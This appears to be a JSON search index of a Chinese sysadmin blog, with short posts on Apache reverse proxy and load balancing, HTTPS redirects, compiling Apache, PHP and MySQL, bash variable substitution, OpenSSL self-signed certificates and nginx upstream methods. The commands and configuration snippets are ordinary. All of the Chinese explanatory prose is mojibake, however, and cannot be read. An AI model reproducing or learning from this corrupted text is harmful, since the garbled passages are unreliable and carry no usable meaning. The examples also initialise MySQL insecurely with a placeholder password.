è¦ä¸ºç‰¹å®šçš„URIè¿›è¡Œä»£ç†ï¼Œå…¶å®ƒçš„æ‰€æœ‰è¯·æ±‚éƒ½åœ¨æœ¬åœ°å¤„ç†ï¼Œå¯æ‰§è¡Œå¦‚ä¸‹é…ç½®ï¼š ProxyPass \"/images\"Â \"http://www.test.com\" å½“å®¢æˆ·ç«¯è¯·æ±‚http://www.soulchild.cn/images/server.gif è¿™ä¸ªURLæ—¶ï¼Œapacheå°†è¯·æ±‚åç«¯æœåŠ¡å™¨http://www.test.com/server.gif åœ°å€ï¼Œæ³¨æ„ï¼Œè¿™é‡Œåœ¨åå‘ä»£ç†åˆ°åç«¯çš„urlåï¼Œ/imagesè¿™ä¸ªè·¯å¾„æ²¡æœ‰å¸¦è¿‡å»ã€‚ æ³¨æ„ï¼šå¦‚æœç¬¬ä¸€ä¸ªå‚æ•°pathç»“å°¾æ·»åŠ äº†ä¸€ä¸ªæ–œæ ï¼Œåˆ™urléƒ¨åˆ†ä¹Ÿå¿…é¡»æ·»åŠ äº†ä¸€ä¸ªæ–œæ  åŠ æ–œæ  ProxyPass \"/img/flv/\"Â \"http://www.abc.com/isg/\" å¯¹æŸä¸ªè·¯å¾„ä¸åšä»£ç†è½¬å‘ï¼š ProxyPass / images/ ! ä½¿ç”¨æ­£åˆ™ï¼š ProxyPassMatch ^(/.*.gif) http://www.static.com/$1 è´Ÿè½½å‡è¡¡ï¼š Â  3ç§è´Ÿè½½å‡è¡¡ç®—æ³•ï¼Œåˆ†åˆ«æ˜¯ï¼š byrequestsï¼šé»˜è®¤ã€‚æŒ‰ç…§è¯·æ±‚æ¬¡æ•°å¹³å‡åˆ†é… å¯ä»¥æ‰‹åŠ¨æŒ‡å®šæƒé‡ï¼Œæƒé‡è¶Šå¤§è®¿é—®è¶Šå¤šï¼šloadfactor=xx bytrafficï¼šæŒ‰ç…§I/Oæµé‡å¤§å°å¹³å‡åˆ†é… bybusynessï¼šæŒ‰ç…§æŒ‚èµ·çš„è¯·æ±‚(æ’é˜Ÿæš‚æœªå¤„ç†)æ•°é‡è®¡ç®—ã€‚åˆ†é…ç»™æ´»è·ƒè¯·æ±‚æ•°æœ€å°‘çš„æœåŠ¡å™¨ ç¼–è¾‘é…ç½®æ–‡ä»¶ vimÂ /usr/local/apache2/conf/extra/site1.conf \u003cVirtualHost *:80\u003e ServerAdmin webmaster@dummy-host2.example.com DocumentRoot \"/usr/local/apache2/docs/site1\" ServerName apache.test.com ErrorLog \"logs/apache.test.com-error_log\" CustomLog \"logs/apache.test.com-access_log\" common \u003cProxy balancer://soulchild\u003e BalancerMember http://10.0.0.239 loadfactor=2Â BalancerMember http://10.0.0.140:81 ProxySet lbmethod=byrequests \u003c/Proxy\u003e proxypass / balancer://soulchild proxypassreverse / balancer://soulchild \u003c/VirtualHost\u003e loadfactor=2å¯ä»¥å®ç°ï¼Œè®¿é—®2æ¬¡10.0.0.239ï¼Œè®¿é—®1æ¬¡10.0.0.140æŒ‰ç…§è¿™æ ·çš„é¡ºåºè®¿é—® ","date":"2019-09-23 17:00","objectID":"/post/941/:0:0","tags":["apache"],"title":"apacheé…ç½®åå‘ä»£ç†å’Œè´Ÿè½½å‡è¡¡","uri":"/post/941/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"åœ¨é…ç½®æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š vim /usr/local/apache2/conf/extra/site1.conf \u003cLocation \"/lbstatus\"\u003e proxypass ! SetHandler balancer-manager Require ip 10.0.0.0/24 \u003c/Location\u003e é€šè¿‡http://ip/lbstatusè®¿é—® ","date":"2019-09-23 16:53","objectID":"/post/946/:0:0","tags":["apache"],"title":"apacheè´Ÿè½½å‡è¡¡å¼€å¯çŠ¶æ€æ£€æµ‹é¡µé¢","uri":"/post/946/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å¼€å¯æ¨¡å—æ”¯æŒï¼š ä¿®æ”¹http.confæ–‡ä»¶ï¼Œå»æ‰æ³¨é‡Š LoadModule ssl_module modules/mod_ssl.so LoadModule socache_shmcb_module modules/mod_socache_shmcb.so Include conf/extra/httpd-ssl.conf è‹¥æœªå®‰è£… mod_ssl.so æ¨¡å—ï¼Œå¯é€šè¿‡æ‰§è¡Œyum install mod_sslÂ å‘½ä»¤å®‰è£…æˆ–ç¼–è¯‘æ¨¡å—å®‰è£…ã€‚ ä¿®æ”¹ä»¥ä¸‹å‚æ•°ï¼š é…ç½®æ–‡ä»¶å‚æ•° è¯´æ˜ SSLEngine on å¯ç”¨SSLåŠŸèƒ½ SSLCertificateFile è¯ä¹¦æ–‡ä»¶ SSLCertificateKeyFile ç§é’¥æ–‡ä»¶ SSLCertificateChainFile è¯ä¹¦é“¾æ–‡ä»¶ Â  vim /usr/local/apache2/conf/extra/httpd-ssl.conf \u003cVirtualHost 0.0.0.0:443\u003e DocumentRoot \"/var/www/html\" #å¡«å†™è¯ä¹¦åç§° ServerName www.domain.com #å¯ç”¨ SSL åŠŸèƒ½ SSLEngine on #è¯ä¹¦æ–‡ä»¶çš„è·¯å¾„ SSLCertificateFile /etc/httpd/ssl/2_www.domain.com.crt #ç§é’¥æ–‡ä»¶çš„è·¯å¾„ SSLCertificateKeyFile /etc/httpd/ssl/3_www.domain.com.key #è¯ä¹¦é“¾æ–‡ä»¶çš„è·¯å¾„ SSLCertificateChainFile /etc/httpd/ssl/1_root_bundle.crt \u003c/VirtualHost\u003e ","date":"2019-09-22 20:51","objectID":"/post/932/:0:0","tags":["apache"],"title":"apacheé…ç½®httpså’Œhttpè·³è½¬","uri":"/post/932/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"HTTP è·³è½¬ HTTPS å¼€å¯æ¨¡å—ï¼š ä¿®æ”¹http.confæ–‡ä»¶ï¼Œå»æ‰æ³¨é‡Š LoadModule rewrite_module modules/mod_rewrite.so æ·»åŠ è·³è½¬é…ç½® \u003cDirectory \"/var/www/html\"\u003e # æ–°å¢ RewriteEngine on RewriteCond %{SERVER_PORT} !^443$ RewriteRule ^(.*)?$ https://%{SERVER_NAME}%{REQUEST_URI} [L,R] \u003c/Directory\u003e é‡å¯apacheæœåŠ¡ apache graceful ","date":"2019-09-22 20:51","objectID":"/post/932/:0:1","tags":["apache"],"title":"apacheé…ç½®httpså’Œhttpè·³è½¬","uri":"/post/932/"},{"categories":["å…¶ä»–"],"content":" [root@localhost ]# vim /usr/lib/systemd/system/httpd.service [Unit] Description=apache After=network.target[Service] Type=forking ExecStart=/usr/local/apache/bin/apachectl start ExecReload=/usr/local/apache/bin/apachectl restart ExecStop=/usr/local/apache/bin/apachectl stop PrivateTmp=true [Install] WantedBy=multi-user.target Â  ============================================================================ å¦‚æœæŠŠPrivateTmpçš„å€¼è®¾ç½®æˆtrue ï¼ŒæœåŠ¡å¯åŠ¨æ—¶ä¼šåœ¨/tmpç›®å½•ä¸‹ç”Ÿæˆç±»ä¼¼systemd-private-433ef27ba3d46d8aac286aeb1390e1b-apache.service-RedVyuçš„æ–‡ä»¶å¤¹ï¼Œç”¨äºå­˜æ”¾apacheçš„ä¸´æ—¶æ–‡ä»¶ã€‚ ä½†æœ‰æ—¶å€™è¿™ç›¸åè€Œä¸æ–¹ä¾¿ï¼Œå¦‚ï¼šå¯åŠ¨mysqlæœåŠ¡ï¼Œ/tmp/mysql.sockæ–‡ä»¶çš„å­˜æ”¾å°±ä¼šæ”¾åˆ°ç§æœ‰æ–‡ä»¶å¤¹ä¸­ï¼Œè¿™æ—¶éœ€è¦å°†PrivateTmpçš„å€¼è®¾ç½®æˆfalseï¼š åŒ…æ‹¬phpè®¿é—®/tmpç›®å½•ä¸‹çš„æ–‡ä»¶æç¤ºæ‰¾ä¸åˆ°çš„æ—¶å€™å¯ä»¥ä¿®æ”¹ä¸ºfalse ç»“è®ºï¼š PrivateTmp=true ","date":"2019-09-22 19:02","objectID":"/post/923/:0:0","tags":[],"title":"centos7ä¸‹è®¿é—®ä¸åˆ°tmpç›®å½•ä¸‹æ–‡ä»¶çš„é—®é¢˜","uri":"/post/923/"},{"categories":["åŸºç¡€å†…å®¹"],"content":" å˜é‡è¡¨è¾¾å¼ è¯´æ˜ ${å˜é‡#å…³é”®å­—} è‹¥å˜é‡å†…å®¹ä»å¤´å¼€å§‹çš„æ•°æ®ç¬¦åˆâ€œå…³é”®å­—â€ï¼Œåˆ™å°†ç¬¦åˆçš„æœ€çŸ­æ•°æ®åˆ é™¤ ${å˜é‡##å…³é”®å­—} è‹¥å˜é‡å†…å®¹ä»å¤´å¼€å§‹çš„æ•°æ®ç¬¦åˆâ€œå…³é”®å­—â€ï¼Œåˆ™å°†ç¬¦åˆçš„æœ€é•¿æ•°æ®åˆ é™¤ ${å˜é‡%å…³é”®å­—} è‹¥å˜é‡å†…å®¹ä»å°¾å‘å‰çš„æ•°æ®ç¬¦åˆâ€œå…³é”®å­—â€ï¼Œåˆ™å°†ç¬¦åˆçš„æœ€çŸ­æ•°æ®åˆ é™¤ ${å˜é‡%%å…³é”®å­—} è‹¥å˜é‡å†…å®¹ä»å°¾å‘å‰çš„æ•°æ®ç¬¦åˆâ€œå…³é”®å­—â€ï¼Œåˆ™å°†ç¬¦åˆçš„æœ€é•¿æ•°æ®åˆ é™¤ ${å˜é‡/æ—§å­—ç¬¦ä¸²/æ–°å­—ç¬¦ä¸²} è‹¥å˜é‡å†…å®¹ç¬¦åˆâ€œæ—§å­—ç¬¦ä¸²â€ï¼Œåˆ™ç¬¬ä¸€ä¸ªæ—§å­—ç¬¦ä¸²ä¼šè¢«æ–°å­—ç¬¦ä¸²æ›¿æ¢ ${å˜é‡//æ—§å­—ç¬¦ä¸²/æ–°å­—ç¬¦ä¸²} è‹¥å˜é‡å†…å®¹ç¬¦åˆâ€œæ—§å­—ç¬¦ä¸²â€ï¼Œåˆ™å…¨éƒ¨çš„æ—§å­—ç¬¦ä¸²ä¼šè¢«æ–°å­—ç¬¦ä¸²æ›¿æ¢ Â  #\u0026##ä¸¾ä¾‹ï¼š [root@apache ~]# echo $str 123/456/78/9/1 #ä»å‰å¾€ååŒ¹é…ï¼Œåˆ é™¤åŒ¹é…çš„æœ€çŸ­çš„å†…å®¹--\u003eâ€œ123/â€ [root@apache ~]# echo ${str#*/} 456/78/9/1 #ä»å‰å¾€ååŒ¹é…ï¼Œåˆ é™¤åŒ¹é…çš„æœ€é•¿çš„å†…å®¹--\u003eâ€œ123/456/78/9/â€ [root@apache ~]# echo ${str##*/} 1 %\u0026%%ä¸¾ä¾‹ï¼š [root@apache ~]# echo $str 123/456/78/9/1 #ä»åå‘å‰åŒ¹é…ï¼Œåˆ é™¤åŒ¹é…æœ€çŸ­çš„éƒ¨åˆ†--\u003eâ€œ/1â€ [root@apache ~]# echo ${str%/*} 123/456/78/9 #ä»åå‘å‰åŒ¹é…ï¼Œåˆ é™¤åŒ¹é…æœ€é•¿çš„éƒ¨åˆ†--\u003eâ€œ/456/78/9/1â€ [root@apache ~]# echo ${str%%/*} 123 /\u0026//ä¸¾ä¾‹ï¼š [root@apache ~]# echo $str 123/123/234/123/1 #æ›¿æ¢123ä¸º000 [root@apache ~]# echo ${str/123/000} 000/123/234/123/1 #æ›¿æ¢æ‰€æœ‰123ä¸º000 [root@apache ~]# echo ${str//123/000} 000/000/234/000/1 ","date":"2019-09-19 12:09","objectID":"/post/907/:0:0","tags":["shell"],"title":"shellä¸­å˜é‡çš„æ›¿æ¢å’Œåˆ é™¤","uri":"/post/907/"},{"categories":["å…¶ä»–"],"content":"1. å®‰è£…ä¾èµ–åŒ… yumå®‰è£…ä¾èµ– yum -y install make gcc-c++ cmake bison-devel ncurses-devel libtool bison perl perl-devel perl perl-devel zlib zlib-devel ","date":"2019-09-19 11:20","objectID":"/post/903/:0:1","tags":["apache"],"title":"apache2.4.39ç¼–è¯‘å®‰è£…","uri":"/post/903/"},{"categories":["å…¶ä»–"],"content":"2. ç¼–è¯‘å®‰è£… ç¼–è¯‘å®‰è£…aprï¼š yum install -y bzip2 tar xf apr-1.6.3.tar.bz2 cd apr-1.6.3 ./configure --prefix=/usr/local/apr make \u0026\u0026 make install ç¼–è¯‘å®‰è£…apr-utilï¼š yum install -y expat expat-devel tar xf apr-util-1.6.1.tar.gz cd apr-util-1.6.1 ./configure --prefix=/usr/local/apr-util --with-apr=/usr/local/apr make \u0026\u0026 make install ç¼–è¯‘å®‰è£…pcreï¼š tar xf pcre-8.41.tar.gz cd pcre-8.41 ./configure --prefix=/usr/local/pcre make \u0026\u0026 make install ç¼–è¯‘å®‰è£…apacheï¼š tar xf httpd-2.4.39.tar.gz cd httpd-2.4.39 ./configure --prefix=/usr/local/apache2 \\ --with-pcre=/usr/local/pcre \\ --with-apr=/usr/local/apr \\ --with-apr-util=/usr/local/apr-util \\ --enable-so \\ --enable-modules=most \\ --enable-mods-shared=all \\ --enable-rewrite=shared make \u0026\u0026 make install ","date":"2019-09-19 11:20","objectID":"/post/903/:0:2","tags":["apache"],"title":"apache2.4.39ç¼–è¯‘å®‰è£…","uri":"/post/903/"},{"categories":["å…¶ä»–"],"content":"3.ç®¡ç†apache2 #åˆ›å»ºè½¯è¿æ¥æ–¹ä¾¿ä½¿ç”¨ ln -s /usr/local/apache2/bin/apachectl /sbin/ #å¯åŠ¨apache apachectl start #åœæ­¢ apachectl stop #é‡å¯ apachectl restart #ä¼˜é›…é‡å¯ apachectl graceful #ä¼˜é›…åœæ­¢ apachectl graceful-stop ","date":"2019-09-19 11:20","objectID":"/post/903/:0:3","tags":["apache"],"title":"apache2.4.39ç¼–è¯‘å®‰è£…","uri":"/post/903/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"æ·»åŠ sslæ¨¡å—ä¸¾ä¾‹ apxså‚æ•°è¯´æ˜ï¼š -iÂ å®‰è£… -a æ¿€æ´»æ¨¡å—(å‘httpd.confæ·»åŠ  LoadModuleæŒ‡ä»¤) -c ç¼–è¯‘æŒ‡å®šæ¨¡å— #è¿›å…¥æºç åŒ…ç›®å½• cd /server/httpd-2.4.39/ #å®‰è£…æ¨¡å— /usr/local/apache2/bin/apxs -i -a -c modules/ssl/mod_ssl.c æŠ¥é”™ï¼š è§£å†³ï¼š #å®‰è£…openssl yum install -y openssl openssl-devel #å†æ¬¡æ‰§è¡Œ /usr/local/apache2/bin/apxs -i -a -c modules/ssl/mod_ssl.c æŠ¥é”™ï¼š googleåˆ°çš„ä¸€ä¸ªè§£å†³æ–¹æ³•ï¼š #æŠŠapacheæºç åŒ…é‡Œçš„modules/mdæ–‡ä»¶å¤¹ä¸­çš„æ‰€æœ‰æ–‡ä»¶å¤åˆ¶åˆ°/usr/inludeæ–‡ä»¶å¤¹ä¸‹é¢ cp modules/md/* /usr/include/ #æ‰§è¡Œ cd /server/httpd-2.4.39/ /usr/local/apache2/bin/apxs -a -i -DHAVE_OPENSSL=1 -I/usr/include/openssl -L/usr/lib64/openssl -c modules/ssl/*.c -lcrypto -lssl -ldl #æ£€æŸ¥é…ç½®æ–‡ä»¶ apachectl -t #é‡å¯apache aapachectlÂ graceful ","date":"2019-09-18 14:59","objectID":"/post/895/:0:0","tags":["apache"],"title":"apacheåŠ¨æ€æ·»åŠ SSLç¼–è¯‘æ¨¡å—ï¼ŒæŠ¥é”™è§£å†³","uri":"/post/895/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"1.å®‰è£…ä¾èµ–åŒ… yum -y install php-mcrypt libmcrypt libmcrypt-devel autoconf freetype freetype-devel gd libmcrypt libpng libpng-devel openjpeg openjpeg-devel libjpeg libjpeg-devel libxml2 libxml2-devel zlib curl curl-devel ","date":"2019-09-18 12:00","objectID":"/post/890/:1:0","tags":["php"],"title":"php7.2ç¼–è¯‘å®‰è£…","uri":"/post/890/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"2. ç¼–è¯‘å®‰è£… tar xf php-7.2.3.tar.gz cd php-7.2.3/ ./configure --prefix=/usr/local/php7 \\ --with-apxs2=/usr/local/apache2/bin/apxs \\ --with-config-file-path=/usr/local/php7/etc/ \\ --enable-mbstring \\ --with-curl \\ --enable-fpm \\ --enable-mysqlnd \\ --enable-bcmath \\ --enable-sockets \\ --enable-ctype \\ --with-jpeg-dir \\ --with-png-dir \\ --with-freetype-dir \\ --with-gettext \\ --with-gd \\ --with-pdo-mysql=mysqlnd \\ --with-mysqli=mysqlnd make \u0026\u0026 make install ","date":"2019-09-18 12:00","objectID":"/post/890/:2:0","tags":["php"],"title":"php7.2ç¼–è¯‘å®‰è£…","uri":"/post/890/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"3. ç”Ÿæˆé…ç½®æ–‡ä»¶ cp php.ini-development /usr/local/php7/etc/php.ini ","date":"2019-09-18 12:00","objectID":"/post/890/:3:0","tags":["php"],"title":"php7.2ç¼–è¯‘å®‰è£…","uri":"/post/890/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"4. ä¿®æ”¹apacheé…ç½®ï¼Œä½¿apacheæ”¯æŒphp vim /usr/local/apache2/ #é…ç½®æ”¯æŒè§£æphpï¼Œé…ç½®æ–‡ä»¶æœ«å°¾æ·»åŠ å³å¯ Addtype application/x-httpd-php .php .phtml #æ·»åŠ index.phpé¦–é¡µæ–‡ä»¶ï¼Œä¿®æ”¹ç°æœ‰é…ç½® DirectoryIndex index.html index.php ","date":"2019-09-18 12:00","objectID":"/post/890/:4:0","tags":["php"],"title":"php7.2ç¼–è¯‘å®‰è£…","uri":"/post/890/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å¦‚æœéœ€è¦php-fpmï¼š vim /etc/systemd/system/php-fpm.service # It's not recommended to modify this file in-place, because it # will be overwritten during upgrades. If you want to customize, # the best way is to use the \"systemctl edit\" command. [Unit] Description=The PHP FastCGI Process Manager After=network.target [Service] Type=simple PIDFile=/usr/local/php7/var/run/php-fpm.pid ExecStart=/usr/local/php7/sbin/php-fpm --nodaemonize --fpm-config /usr/local/php7/etc/php-fpm.conf ExecReload=/bin/kill -USR2 $MAINPID PrivateTmp=true [Install] WantedBy=multi-user.target ","date":"2019-09-18 12:00","objectID":"/post/890/:5:0","tags":["php"],"title":"php7.2ç¼–è¯‘å®‰è£…","uri":"/post/890/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"å®‰è£…åŒ…ä¸‹è½½åœ°å€ï¼šhttps://cdn.mysql.com/archives/mysql-5.7/mysql-boost-5.7.20.tar.gz ä¾èµ–åŒ…ï¼š yum -y install make gcc-c++ cmake bison-devel ncurses-devel libtool bison perl perl-devel perl perl-devel ","date":"2019-09-18 11:35","objectID":"/post/870/:0:0","tags":["mysql"],"title":"mysql5.7.20ç¼–è¯‘å®‰è£…","uri":"/post/870/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"1. è§£å‹ tar -zxvf mysql-boost-5.7.20.tar.gz ","date":"2019-09-18 11:35","objectID":"/post/870/:1:0","tags":["mysql"],"title":"mysql5.7.20ç¼–è¯‘å®‰è£…","uri":"/post/870/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"2. åˆ›å»ºç”¨æˆ· useradd mysql -M -s /sbin/nologin ","date":"2019-09-18 11:35","objectID":"/post/870/:2:0","tags":["mysql"],"title":"mysql5.7.20ç¼–è¯‘å®‰è£…","uri":"/post/870/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"3. ç¼–è¯‘å®‰è£… cd mysql-5.7.20/ cmake \\ -DCMAKE_INSTALL_PREFIX=/usr/local/mysql \\ -DEXTRA_CHARSETS=all \\ -DDEFAULT_CHARSET=utf8 \\ -DDEFAULT_COLLATION=utf8_general_ci \\ -DWITH_INNOBASE_STORAGE_ENGINE=1 \\ -DWITH_MYISAM_STORAGE_ENGINE=1 \\ -DMYSQL_USER=mysql \\ -DMYSQL_TCP_PORT=3306 \\ -DWITH_BOOST=boost \\ -DENABLED_LOCAL_INFILE=1 \\ -DWITH_PARTITION_STORAGE_ENGINE=1 \\ -DMYSQL_UNIX_ADDR=/tmp/mysqld.sock \\ -DWITH_EMBEDDED_SERVER=1 make \u0026\u0026 make install ","date":"2019-09-18 11:35","objectID":"/post/870/:3:0","tags":["mysql"],"title":"mysql5.7.20ç¼–è¯‘å®‰è£…","uri":"/post/870/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"4. åˆå§‹åŒ–æ•°æ®åº“ mkdir -p /data/mysql chown -R mysql.mysql /data/mysql /usr/local/mysql/bin/mysqld --initialize-insecure --user=mysql --basedir=/usr/local/mysql --datadir=/data/mysql ","date":"2019-09-18 11:35","objectID":"/post/870/:4:0","tags":["mysql"],"title":"mysql5.7.20ç¼–è¯‘å®‰è£…","uri":"/post/870/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"5. ç¼–è¾‘é…ç½®æ–‡ä»¶ vim /etc/my.cnf [mysqld] basedir=/usr/local/mysql datadir=/data/mysql socket=/tmp/mysql.sock port=3306 [mysql] socket=/tmp/mysql.sock ","date":"2019-09-18 11:35","objectID":"/post/870/:5:0","tags":["mysql"],"title":"mysql5.7.20ç¼–è¯‘å®‰è£…","uri":"/post/870/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"6. åˆ›å»ºå¯åŠ¨è„šæœ¬,å¯åŠ¨æœåŠ¡ vim /etc/systemd/system/mysqld.service [Unit] Description=MySQL Server Documentation=man:mysqld(8) Documentation=http://dev.mysql.com/doc/refman/en/using-systemd.html After=network.target After=syslog.target [Install] WantedBy=multi-user.target [Service] User=mysql Group=mysql ExecStart=/usr/local/mysql/bin/mysqld --defaults-file=/etc/my.cnf LimitNOFILE = 5000 #å¯åŠ¨å’Œè®¾ç½®å¼€æœºè‡ªå¯ systemctl start mysqld systemctl enable mysqld ##7. æ·»åŠ ç¯å¢ƒå˜é‡ï¼Œåœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ  vim /etc/profile export PATH=/usr/local/mysql/bin:$PATH #æ‰§è¡Œprofileï¼Œé‡æ–°ç”Ÿæ•ˆ source /etc/profile ##8.è®¾ç½®mysqlå¯†ç  mysqladmin -S /tmp/mysql.sock -uroot password 'mima' ","date":"2019-09-18 11:35","objectID":"/post/870/:6:0","tags":["mysql"],"title":"mysql5.7.20ç¼–è¯‘å®‰è£…","uri":"/post/870/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"groupname=nginx \u0026\u0026 cat /etc/passwd | grep `grep ${groupname} /etc/group | awk -F: '{print $3}'` | awk -F: '{print $1}' \u0026\u0026 unset groupname ","date":"2019-09-12 15:34","objectID":"/post/873/:0:0","tags":[],"title":"linuxæŸ¥çœ‹ç»„å†…æˆå‘˜","uri":"/post/873/"},{"categories":["å…¶ä»–"],"content":"https://myssl.com/ https://www.ssllabs.com/ssltest/ ","date":"2019-09-10 16:31","objectID":"/post/868/:0:0","tags":[],"title":"åœ¨çº¿httpsç½‘ç«™éªŒè¯","uri":"/post/868/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¸€ã€è¯ä¹¦ç”³è¯·è¿‡ç¨‹ï¼š ç”Ÿæˆkeyå’Œcsræ–‡ä»¶â€”-\u003eé€šè¿‡csræ–‡ä»¶å‘è¯ä¹¦é¢å‘æœºæ„(CA)ç”³è¯·crtæ–‡ä»¶ äºŒã€ç”Ÿæˆkeyå’Œcsræ–‡ä»¶ï¼š åˆ›å»ºç›®å½• mkdir /server/cert -p cd /server/cert ç”Ÿæˆç§é’¥å’Œè¯ä¹¦ç­¾ç½²æ–‡ä»¶ openssl req -new -newkey rsa:2048 -sha256 -nodes -out test.com.csr -keyout test.com.key -subj \"/C=CN/ST=beijing/L=beijing/O=test Inc./OU=Web Security/CN=test.com\" Cå­—æ®µï¼šå³Countryï¼Œè¡¨ç¤ºå•ä½æ‰€åœ¨å›½å®¶ï¼Œä¸ºä¸¤ä½æ•°çš„å›½å®¶ç¼©å†™ï¼Œå¦‚CNè¡¨ç¤ºä¸­å›½ STå­—æ®µï¼š State/Provinceï¼Œå•ä½æ‰€åœ¨å·æˆ–çœ Lå­—æ®µï¼š Localityï¼Œå•ä½æ‰€åœ¨åŸå¸‚/æˆ–å¿åŒº Oå­—æ®µï¼š Organizationï¼Œæ­¤ç½‘ç«™çš„å•ä½åç§° OUå­—æ®µï¼š Organization Unitï¼Œä¸‹å±éƒ¨é—¨åç§°;ä¹Ÿå¸¸å¸¸ç”¨äºæ˜¾ç¤ºå…¶ä»–è¯ä¹¦ç›¸å…³ä¿¡æ¯ï¼Œå¦‚è¯ä¹¦ç±»å‹ï¼Œè¯ä¹¦äº§å“åç§°æˆ–èº«ä»½éªŒè¯ç±»å‹æˆ–éªŒè¯å†…å®¹ç­‰ CNå­—æ®µï¼šCommon Nameï¼Œç½‘ç«™çš„åŸŸå ä¸‰ã€ç”³è¯·è¯ä¹¦æ–‡ä»¶ ä½¿ç”¨csræ–‡ä»¶ç”³è¯·è¯ä¹¦å³å¯ã€‚ 1ã€é˜¿é‡Œäº‘ https://common-buy.aliyun.com/?commodityCode=cas#/buy 2ã€è…¾è®¯äº‘DV SSL è¯ä¹¦ https://cloud.tencent.com/product/ssl ä¹Ÿå¯ä»¥è‡ªå·±å……å½“CAæœºæ„ æ“ä½œå¦‚ä¸‹ï¼š åˆ›å»ºç›®å½• mkdir /server/ca -p cd /server/ca åˆ›å»ºCAè¯ä¹¦ openssl genrsa -out ca.key 2048 ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ï¼ˆä½¿ç”¨å·²æœ‰ç§é’¥ca.keyè‡ªè¡Œç­¾å‘æ ¹è¯ä¹¦ï¼‰ openssl req -x509 -new -nodes -key ca.key -days 10000 -out ca.crt -subj \"/CN=my-ca\" æ ¹æ®csrç”Ÿæˆè¯ä¹¦æ–‡ä»¶ï¼ˆæŒ‡å®šæ­¥éª¤äºŒä¸­ç”Ÿæˆçš„è¯ä¹¦ç­¾ç½²æ–‡ä»¶ï¼‰ openssl x509 -req -in /server/cert/test.com.csr -CA ca.crt -CAkey ca.key -CAcreateserial -days 365 -out /server/cert/test.com.crt","date":"2019-09-10 16:08","objectID":"/post/859/:0:0","tags":["ssl"],"title":"SSLã€TSLè¯ä¹¦æ–‡ä»¶ç”³è¯·å’Œè‡ªç­¾è¯ä¹¦","uri":"/post/859/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å‚è€ƒï¼šhttps://blog.csdn.net/chenyulancn/article/details/70800991 1.è½®è¯¢ï¼ˆé»˜è®¤ï¼‰ï¼Œæ¯ä¸ªè¯·æ±‚æŒ‰æ—¶é—´é¡ºåºé€ä¸€åˆ†é…åˆ°ä¸åŒçš„åç«¯æœåŠ¡å™¨ï¼Œå¦‚æœåç«¯æŸå°æœåŠ¡å™¨æ­»æœºï¼Œæ•…éšœç³»ç»Ÿè¢«è‡ªåŠ¨å‰”é™¤ï¼Œä½¿ç”¨æˆ·è®¿é—®ä¸å—å½±å“ã€‚ 2.Weightï¼ŒæŒ‡å®šè½®è¯¢æƒå€¼ï¼ŒWeightå€¼è¶Šå¤§ï¼Œåˆ†é…åˆ°çš„è®¿é—®æœºç‡è¶Šé«˜ï¼Œä¸»è¦ç”¨äºåç«¯æ¯ä¸ªæœåŠ¡å™¨æ€§èƒ½ä¸å‡çš„æƒ…å†µä¸‹ã€‚ ä¸¾ä¾‹ï¼š upstream bakend { server 192.168.0.14 weight=10; server 192.168.0.15 weight=10; } 3.ip_hashï¼Œæ¯ä¸ªè¯·æ±‚æŒ‰è®¿é—®IPçš„hashç»“æœåˆ†é…ï¼Œè¿™æ ·æ¥è‡ªåŒä¸€ä¸ªIPçš„è®¿å®¢å›ºå®šè®¿é—®ä¸€ä¸ªåç«¯æœåŠ¡å™¨ï¼Œæœ‰æ•ˆè§£å†³äº†åŠ¨æ€ç½‘é¡µå­˜åœ¨çš„sessionå…±äº«é—®é¢˜ã€‚ ä¸¾ä¾‹ï¼š upstream bakend { ip_hash; server 192.168.0.14:88; server 192.168.0.15:80; } 4.fairï¼ˆç¬¬ä¸‰æ–¹ï¼‰ æ¯”ä¸Šé¢ä¸¤ä¸ªæ›´åŠ æ™ºèƒ½çš„è´Ÿè½½å‡è¡¡ç®—æ³•ã€‚æ ¹æ®åç«¯æœåŠ¡å™¨çš„å“åº”æ—¶é—´æ¥åˆ†é…è¯·æ±‚ï¼Œå“åº”æ—¶é—´çŸ­çš„ä¼˜å…ˆåˆ†é…ã€‚Nginxæœ¬èº«æ˜¯ä¸æ”¯æŒfairçš„ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨è¿™ç§è°ƒåº¦ç®—æ³•ï¼Œå¿…é¡»ä¸‹è½½Nginxçš„upstream_fairæ¨¡å—ã€‚ ä¸¾ä¾‹ï¼š upstream backend { server server1; server server2; fair; } 5.url_hashï¼ˆç¬¬ä¸‰æ–¹ï¼‰ æŒ‰è®¿é—®urlçš„hashç»“æœæ¥åˆ†é…è¯·æ±‚ï¼Œä½¿æ¯ä¸ªurlå®šå‘åˆ°åŒä¸€ä¸ªåç«¯æœåŠ¡å™¨ï¼Œå¯ä»¥è¿›ä¸€æ­¥æé«˜åç«¯ç¼“å­˜æœåŠ¡å™¨çš„æ•ˆç‡ã€‚Nginxæœ¬èº«æ˜¯ä¸æ”¯æŒurl_hashçš„ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨è¿™ç§è°ƒåº¦ç®—æ³•ï¼Œå¿…é¡»å®‰è£…Nginx çš„hashè½¯ä»¶åŒ…ã€‚ ä¸¾ä¾‹ï¼š upstream backend { server squid1:3128; server squid2:3128; hash $request_uri; hash_method crc32; } 